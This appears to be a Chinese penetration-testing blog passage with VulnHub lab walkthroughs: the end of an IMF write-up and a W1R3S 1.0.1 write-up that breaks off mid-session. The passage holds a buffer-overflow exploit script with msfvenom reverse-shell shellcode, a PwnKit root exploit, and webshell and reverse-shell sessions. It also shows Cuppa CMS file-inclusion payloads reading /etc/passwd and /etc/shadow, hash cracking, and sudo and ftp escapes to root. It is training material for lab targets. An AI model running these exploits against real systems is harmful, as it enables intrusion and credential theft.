</p><p><strong>9、edb调试提权</strong></p><p>使用edb对程序进行测试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> edb --run agent</span><br></code></pre></td></tr></table></figure><p>运行程序后先选择 <code>3.submit report</code> 进行测试：</p><p>运行<code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1024</code>来获取1024个测试字符，然后输入字符：</p><p><img src="https://image.3001.net/images/20180710/1531208091689.png!small" alt="A.png"></p><p>再用 <code>/usr/share/metasploit-­‐framework/tools/pattern_offset.rb -q 41366641</code> 反查：</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">[*] <span class="hljs-built_in">Exact</span> <span class="hljs-built_in">match</span> at <span class="hljs-built_in">offset</span> <span class="hljs-number">168</span><br></code></pre></td></tr></table></figure><p>发现程序在第168个字符处溢出，再生成 A*168+B*4+C*1000 的测试字符：</p><p><img src="https://image.3001.net/images/20180710/15312081152906.png!small" alt="B.png"></p><p>发现 EAX 变成了一堆 A，看能不能找到 <code>call eax</code> 。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 22:37:10nasm &gt; call eax 00000000 FFD0 call eax</span><br></code></pre></td></tr></table></figure><p>edb里搜索 FFD0，找到地址 <code>0x08048563</code> ：</p><p><img src="https://image.3001.net/images/20180710/15312081667844.png!small" alt="C.png"></p><p>重启程序发现地址不变，就选这个地址来作为EIP的值。</p><p>生成shell：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.190.1 LPORT=6666 -f python -b <span class="hljs-string">&quot;\x00\x0a\x0d&quot;</span> &gt; ATK.py</span>       <br>[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload                         [-] No arch selected, selecting arch: x86 from the payload                                                   Found 10 compatible encoders                                                                                 Attempting to encode payload with 1 iterations of x86/shikata_ga_nai                                         x86/shikata_ga_nai succeeded with size 95 (iteration=0)                                                     x86/shikata_ga_nai chosen with final size 95                                                                 Payload size: 95 bytes                                                                                       Final size of python file: 470 bytes<br></code></pre></td></tr></table></figure><p>编写exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> time<br><br>host = <span class="hljs-string">&quot;192.168.135.146&quot;</span><br>port = <span class="hljs-number">7788</span><br><br>ret = <span class="hljs-string">&quot;\x63\x85\x04\x08\n&quot;</span><br><br>buf =  <span class="hljs-string">&quot;&quot;</span><br>buf += <span class="hljs-string">&quot;\xbb\xa3\xdc\x2d\x95\xdb\xc2\xd9\x74\x24\xf4\x5f\x33&quot;</span><br>buf += <span class="hljs-string">&quot;\xc9\xb1\x12\x31\x5f\x12\x03\x5f\x12\x83\x64\xd8\xcf&quot;</span><br>buf += <span class="hljs-string">&quot;\x60\x5b\x3a\xf8\x68\xc8\xff\x54\x05\xec\x76\xbb\x69&quot;</span><br>buf += <span class="hljs-string">&quot;\x96\x45\xbc\x19\x0f\xe6\x82\xd0\x2f\x4f\x84\x13\x47&quot;</span><br>buf += <span class="hljs-string">&quot;\x90\xde\x5a\x96\x78\x1d\xa3\x82\x72\xa8\x42\x02\xe4&quot;</span><br>buf += <span class="hljs-string">&quot;\xfa\xd5\x31\x5a\xf9\x5c\x54\x51\x7e\x0c\xfe\x04\x50&quot;</span><br>buf += <span class="hljs-string">&quot;\xc2\x96\xb0\x81\x0b\x04\x28\x57\xb0\x9a\xf9\xee\xd6&quot;</span><br>buf += <span class="hljs-string">&quot;\xaa\xf5\x3d\x98&quot;</span><br>buf += <span class="hljs-string">&quot;A&quot;</span> * (<span class="hljs-number">168</span> - <span class="hljs-built_in">len</span>(buf))<br>buf += ret<br><br>con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>con.connect((host, port))<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Connected&quot;</span><br><br><span class="hljs-built_in">print</span> con.recv(<span class="hljs-number">1024</span>)<br>con.send(<span class="hljs-string">b&quot;48093572\n&quot;</span>)<br><span class="hljs-built_in">print</span> con.recv(<span class="hljs-number">1024</span>)<br>con.send(<span class="hljs-string">b&quot;3\n&quot;</span>)<br><span class="hljs-built_in">print</span> con.recv(<span class="hljs-number">1024</span>)<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Sending evil buffer...&quot;</span><br>con.send(buf)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;done&quot;</span><br></code></pre></td></tr></table></figure><p>打开 nc 监听 6666 端口,然后就得到了 root 权限。</p><p><strong>10、cve-2021-4034：</strong></p><blockquote><p>不同的 shell 运行结果不一致，php-reverse-shell.php 可以成功，weevely 生成的 cd5bb348e612.gif 不可以成功 。</p></blockquote><p><strong>cd5bb348e612.gif：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> weevely http://192.168.135.146/imfadministrator/uploads/cd5bb348e612.gif <span class="hljs-built_in">test</span></span><br><br>[+] weevely 4.0.1<br><br>[+] Target:     www-data@imf:/var/www/html/imfadministrator/uploads<br>[+] Session:    /home/kali/.weevely/sessions/192.168.135.146/cd5bb348e612_0.session<br>[+] Shell:      System shell<br><br>[+] Browse the filesystem or execute commands starts the connection<br>[+] to the target. Type :help for more information.<br><br>www-data@imf:/var/www/html/imfadministrator/uploads $ ls<br>a.out<br>cd5bb348e612.gif<br>cve-2021-4034-poc2.c<br>flag5_abc123def.txt<br>php-reverse-shell.php<br>www-data@imf:/var/www/html/imfadministrator/uploads $ ./a.out<br>Current User before execute exploit<br><span class="hljs-meta">hacker@victim$</span><span class="bash">whoami: www-data</span><br>Exploit written by @luijait (0x6c75696a616974)<br>[+] Enjoy your root if exploit was completed succesfully<br>bash: cannot set terminal process group (1288): Inappropriate ioctl for device<br>bash: no job control in this shell<br>root@imf:/var/www/html/imfadministrator/uploads# exit<br>www-data@imf:/var/www/html/imfadministrator/uploads $ <br><br><br>www-data@imf:/var/www/html/imfadministrator/uploads $ ./a.out<br>GLib: Cannot convert message: Could not open converter from &#x27;UTF-8&#x27; to &#x27;PWNKIT&#x27;<br>pkexec must be setuid root<br>www-data@imf:/var/www/html/imfadministrator/uploads $ <br></code></pre></td></tr></table></figure><p><strong>php-reverse-shell.php：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 1234</span><br>listening on [any] 1234 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.146] 59416<br>Linux imf 4.4.0-210-generic #242-Ubuntu SMP Fri Apr 16 09:57:56 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux<br> 10:12:02 up 16 min,  0 users,  load average: 0.54, 0.60, 0.46<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>/bin/sh: 0: can&#x27;t access tty; job control turned off<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>www-data<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">pwd</span></span><br>/<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> /var/www/html/imfadministrator/uploads</span><br><span class="hljs-meta">$</span><span class="bash"> ls</span><br>GCONV_PATH=.<br>a.out<br>cd5bb348e612.gif<br>cve-2021-4034-poc2.c<br>flag5_abc123def.txt<br>php-reverse-shell.php<br>tmp<br><span class="hljs-meta">$</span><span class="bash"> ./a.out</span><br>Current User before execute exploit<br><span class="hljs-meta">hacker@victim$</span><span class="bash">whoami: www-data</span><br>Exploit written by @luijait (0x6c75696a616974)mkdir: cannot create directory &#x27;GCONV_PATH=.&#x27;: File exists<br>mkdir: cannot create directory &#x27;tmp&#x27;: File exists<br><br>[+] Enjoy your root if exploit was completed succesfully<br>bash: cannot set terminal process group (1288): Inappropriate ioctl for device<br>bash: no job control in this shell<br>root@imf:/var/www/html/imfadministrator/uploads# whoami<br>whoami<br>root<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>W1R3S：1.0.1</title>
    <link href="/2022/05/01/Penetration/Vulnhub/Part-1/0x02%20W1R3S/"/>
    <url>/2022/05/01/Penetration/Vulnhub/Part-1/0x02%20W1R3S/</url>
    
    <content type="html"><![CDATA[<h1 id="0x02-W1R3S-1-0-1-vulnhub"><a href="#0x02-W1R3S-1-0-1-vulnhub" class="headerlink" title="0x02 W1R3S: 1.0.1~vulnhub"></a>0x02 W1R3S: 1.0.1~vulnhub</h1><blockquote><p>靶机地址：<a href="https://www.vulnhub.com/entry/w1r3s-101,220/">W1R3S: 1.0.1 ~ VulnHub</a></p><p>环境信息：</p><ul><li>攻击机 IP：192.168.135.141</li><li>靶机 IP：192.168.135.145</li></ul></blockquote><h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h3><p><strong>nmap 命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24    <span class="hljs-comment"># 扫描该网段上活跃的主机</span></span><br></code></pre></td></tr></table></figure><p><strong>arp-scan 命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo arp-scan -l</span>                                                                                           <br>Interface: eth0, type: EN10MB, MAC: 00:0c:29:38:c2:06, IPv4: 192.168.135.141<br>Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)<br>192.168.135.1   00:50:56:c0:00:08       VMware, Inc.<br>192.168.135.2   00:50:56:eb:65:60       VMware, Inc.<br>192.168.135.145 00:0c:29:9e:ec:6d       VMware, Inc.<br>192.168.135.254 00:50:56:e6:a4:73       VMware, Inc.<br><br>4 packets received by filter, 0 packets dropped by kernel<br>Ending arp-scan 1.9.7: 256 hosts scanned in 1.978 seconds (129.42 hosts/sec). 4 responded<br></code></pre></td></tr></table></figure><p><strong>得到靶机 ip：192.168.135.145</strong></p><h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p><strong>nmap 命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sS -A -p- 192.168.135.145     <span class="hljs-comment"># 全端口扫描</span></span><br></code></pre></td></tr></table></figure><p><strong>简单的端口扫描：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -p- 192.168.135.145</span><br></code></pre></td></tr></table></figure><p><strong>全面扫描：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -A -p- 192.168.135.145</span><br></code></pre></td></tr></table></figure><p><strong>得到目标端口信息</strong></p><div class="table-container"><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>其他</th></tr></thead><tbody><tr><td>21/tcp</td><td>open</td><td>ftp</td><td>Anonymous FTP login allowed</td></tr><tr><td>22/tcp</td><td>open</td><td>ssh</td><td></td></tr><tr><td>80/tcp</td><td>open</td><td>http</td><td></td></tr><tr><td>3306/tcp</td><td>open</td><td>mysql</td></tr></tbody></table></div><h3 id="3、端口探测"><a href="#3、端口探测" class="headerlink" title="3、端口探测"></a>3、端口探测</h3><p><strong>21端口</strong></p><blockquote><p>FTP 的匿名登录一般有三种：</p><ul><li>用户名：anonymous；密码：Email或者为空</li><li>用户名：FTP；密码：FTP或者为空</li><li>用户名：USER；密码：pass</li></ul><p>ftp 命令参考：<a href="https://blog.csdn.net/qq_38526635/article/details/82147980">FTP常见命令详解_luckycyong的博客-CSDN博客</a></p></blockquote><p>ftp 存在匿名登陆（用户名anonymous，密码为空）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ftp 192.168.135.145</span><br></code></pre></td></tr></table></figure><p>下载整个ftp目录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wget ftp://192.168.135.145/* --ftp-user=anonymous --ftp-password= -r</span> <br></code></pre></td></tr></table></figure><p>没有发现什么可用的信息。</p><p><strong>22端口</strong></p><p>暂时未得到 username 和 password 的相关信息，无法使用 ssh。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh 192.168.135.145</span><br>----------------------<br>Think this is the way?<br>----------------------<br>Well,........possibly.<br>----------------------<br>kali@192.168.135.145&#x27;s password: <br></code></pre></td></tr></table></figure><p><strong>3306端口</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> mysql -h 192.168.135.145 -P 3306 -uroot -p</span><br>Enter password: <br>ERROR 1130 (HY000): Host &#x27;192.168.135.141&#x27; is not allowed to connect to this MySQL server<br></code></pre></td></tr></table></figure><p><strong>80端口</strong></p><p>dirb 爆破目录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.145:80</span><br></code></pre></td></tr></table></figure><p>gobuster 爆破目录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gobuster dir -u http://192.168.135.145/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> gobuster dir -u http://192.168.135.145/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -n -e</span><br></code></pre></td></tr></table></figure><blockquote><p>gobuster ：<a href="https://www.kali.org/tools/gobuster/">gobuster | Kali Linux Tools</a></p><p>GitHub：<a href="https://github.com/OJ/gobuster">OJ/gobuster: Directory/File, DNS and VHost busting tool written in Go</a></p><p>gobuster 使用参考：<a href="https://blog.csdn.net/nzjdsds/article/details/86756828">GOBUSTER - 目录/文件和DNS爆破工具。_大方子的博客-CSDN博客</a></p></blockquote><p>找到了几个重要的目录：/administrator 和 /wordpress 。</p><p>先访问 <a href="http://192.168.135.145/administrator，发现这个是">http://192.168.135.145/administrator，发现这个是</a> Cuppa CMS 的安装设置，猜测可能已经安装了 Cuppa CMS 。</p><p>再访问 <a href="http://192.168.135.145/wordpress，发现打不开，直接">http://192.168.135.145/wordpress，发现打不开，直接</a> wpscan 扫描：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://192.168.135.145/wordpress</span><br>Scan Aborted: The URL supplied redirects to http://localhost/wordpress/. Use the --ignore-main-redirect option to ignore the redirection and scan the target, or change the --url option value to the redirected URL.<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://localhost/wordpress/</span><br>Scan Aborted: The url supplied &#x27;http://localhost/wordpress/&#x27; seems to be down (Couldn&#x27;t connect to server)<br></code></pre></td></tr></table></figure><p>发现是个重定向，重定向到了本地，选择忽略重定向之后，显示没有运行 wordpress，修改 hosts 文件后仍无法进行扫描 。</p><h2 id="二、权限获取"><a href="#二、权限获取" class="headerlink" title="二、权限获取"></a>二、权限获取</h2><p>查找 Cuppa 漏洞脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit Cuppa</span><br>--------------------------------------------------------------------------------- --------------------------<br> Exploit Title                                                                   |  Path<br>--------------------------------------------------------------------------------- --------------------------<br>Cuppa CMS - &#x27;/alertConfigField.php&#x27; Local/Remote File Inclusion                  | php/webapps/25971.txt<br>--------------------------------------------------------------------------------- --------------------------<br>Shellcodes: No Results<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> searchsploit -m 25971.txt</span><br>  Exploit: Cuppa CMS - &#x27;/alertConfigField.php&#x27; Local/Remote File Inclusion<br>      URL: https://www.exploit-db.com/exploits/25971<br>     Path: /usr/share/exploitdb/exploits/php/webapps/25971.txt<br>File Type: ASCII text, with very long lines, with CRLF line terminators<br><br>Copied to: /home/kali/25971.txt  <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> searchsploit -x 25971.txt</span><br>  Exploit: Cuppa CMS - &#x27;/alertConfigField.php&#x27; Local/Remote File Inclusion<br>      URL: https://www.exploit-db.com/exploits/25971<br>     Path: /usr/share/exploitdb/exploits/php/webapps/25971.txt<br>File Type: ASCII text, with very long lines, with CRLF line terminators<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> searchsploit -m 文件名 直接将该脚本复制到当前目录下</span><br><span class="hljs-meta">#</span><span class="bash"> searchsploit -x 文件名 直接查看该脚本内容</span><br></code></pre></td></tr></table></figure><p>查看该文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /usr/share/exploitdb/exploits/php/webapps/25971.txt</span><br></code></pre></td></tr></table></figure><p>得到两个 payload：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs clean">#####################################################<br>EXPLOIT<br>#####################################################<br><br>http:<span class="hljs-comment">//target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?</span><br>http:<span class="hljs-comment">//target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</span><br></code></pre></td></tr></table></figure><p>发现该 CMS 存在一个本地/远程文件包含的漏洞。</p><p>经过尝试，发现关闭了远程文件包含，只能进行本地文件包含，所以，尝试得到用户名密码后进行解密。</p><h3 id="M1、burp"><a href="#M1、burp" class="headerlink" title="M1、burp"></a>M1、burp</h3><p>直接浏览器访问，读取 <code>/etc/passwd</code> 文件：</p><p><a href="http://192.168.135.145/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://192.168.135.145/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a></p><p>显示不存在，考虑到扫到的目录为 administrator ，所以对 payload 进行如下修改：</p><p><a href="http://192.168.135.145/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://192.168.135.145/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a></p><p>再次访问，虽成功访问，但没有内容显示。</p><p>用 burp 抓包，将 GET 方式改成 POST 方式，进行尝试，成功得到 <strong><code>username:w1r3s</code></strong></p><p>同样的方法读取 <code>/etc/shadow</code> ：</p><p><a href="http://192.168.135.145/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/shadow">http://192.168.135.145/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/shadow</a></p><p>得到用户 <code>w1r3s</code> 的 <code>salt 密码</code> ，用 <code>john</code> 破解此密码，得到<strong><code>password:computer</code></strong></p><p>ssh 登录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh w1r3s@192.168.135.145</span><br><br>w1r3s@W1R3S:~$ whoami<br>\w1r3s<br>w1r3s@W1R3S:~$ id<br>uid=1000(w1r3s) gid=1000(w1r3s) groups=1000(w1r3s),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)<br></code></pre></td></tr></table></figure><h3 id="M2、Curl"><a href="#M2、Curl" class="headerlink" title="M2、Curl"></a>M2、Curl</h3><blockquote><p>Curl详解：<a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">curl 的用法指南 - 阮一峰 (ruanyifeng.com)</a></p></blockquote><p>使用 curl 来利用 LFI 漏洞获取 <code>/etc/password</code> 文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -s --data-urlencode <span class="hljs-string">&#x27;urlConfig=../../../../../../../../../etc/passwd&#x27;</span> http://192.168.135.145/administrator/alerts/alertConfigField.php</span><br><br>w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash<br></code></pre></td></tr></table></figure><p>找到了一个用户 <code>w1r3s</code> ，然后同样的方法读取 <code>/etc/shadow</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -s --data-urlencode <span class="hljs-string">&#x27;urlConfig=../../../../../../../../../etc/shadow&#x27;</span> http://192.168.135.145/administrator/alerts/alertConfigField.php</span><br><br>w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::<br></code></pre></td></tr></table></figure><p>找到了用户 <code>w1r3s</code> 的 <code>salt 密码</code> ，将密码复制到 <code>1.txt</code> 文件中，用 <code>john</code> 破解此密码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> john 1.txt --show</span><br>w1r3s:computer:17567:0:99999:7:::<br><br>1 password hash cracked, 0 left<br></code></pre></td></tr></table></figure><p><strong>shadow 文件解析：</strong></p><p>文件的格式为：{用户名}：{加密后的口令密码}：{口令最后修改时间距原点(1970-1-1)的天数}：{口令最小修改间隔(防止修改口令，如果时限未到，将恢复至旧口令)：{口令最大修改间隔}：{口令失效前的警告天数}：{账户不活动天数}：{账号失效天数}：{保留}</p><blockquote><p>其中{加密后的口令密码}的格式为：$id$salt$encrypted</p><ul><li>id为1时，采用md5算法加密</li><li>id为5时，采用SHA256算法加密</li><li>id为6时，采用SHA512算法加密</li><li>salt为盐值，是对密码进行hash的一个干扰值</li><li>encrypted为散列值</li></ul></blockquote><h2 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h2><h3 id="M1：直接提权"><a href="#M1：直接提权" class="headerlink" title="M1：直接提权"></a>M1：直接提权</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 直接重置 root 密码</span><br><span class="hljs-meta">#</span><span class="bash"> 由于 ubtun 系统默认是没有激活 root 用户的，需要管理员手工进行操作 sudo passwd 或者 sudo passwd root</span><br><span class="hljs-meta">#</span><span class="bash"> 或者直接 sudo 就能拿到 root</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 或者 sudo -i 直接无密码进入 root</span><br>w1r3s@W1R3S:~$ sudo -i<br>root@W1R3S:~# logout<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 或者 sudo su 直接无密码进入 root</span><br>w1r3s@W1R3S:~$ sudo su<br>root@W1R3S:/home/w1r3s# exit<br>w1r3s@W1R3S:~$ sudo su -<br>root@W1R3S:~# logout<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ id<br>$ sudo -l<br>$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/bin/bash&#x27;</span> &gt;&gt; root.sh<br>$ chmod +x root.sh<br>$ sudo ./root.sh<br></code></pre></td></tr></table></figure><h3 id="M2：使用ftp提权"><a href="#M2：使用ftp提权" class="headerlink" title="M2：使用ftp提权"></a>M2：使用ftp提权</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">w1r3s@W1R3S:~$ sudo ftp<br><span class="hljs-meta">ftp&gt;</span><span class="bash"> !/bin/bash</span><br>root@W1R3S:~# 